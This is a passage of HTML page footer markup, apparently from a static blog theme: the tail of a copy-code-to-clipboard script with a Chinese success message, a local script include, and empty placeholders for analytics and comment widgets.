        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
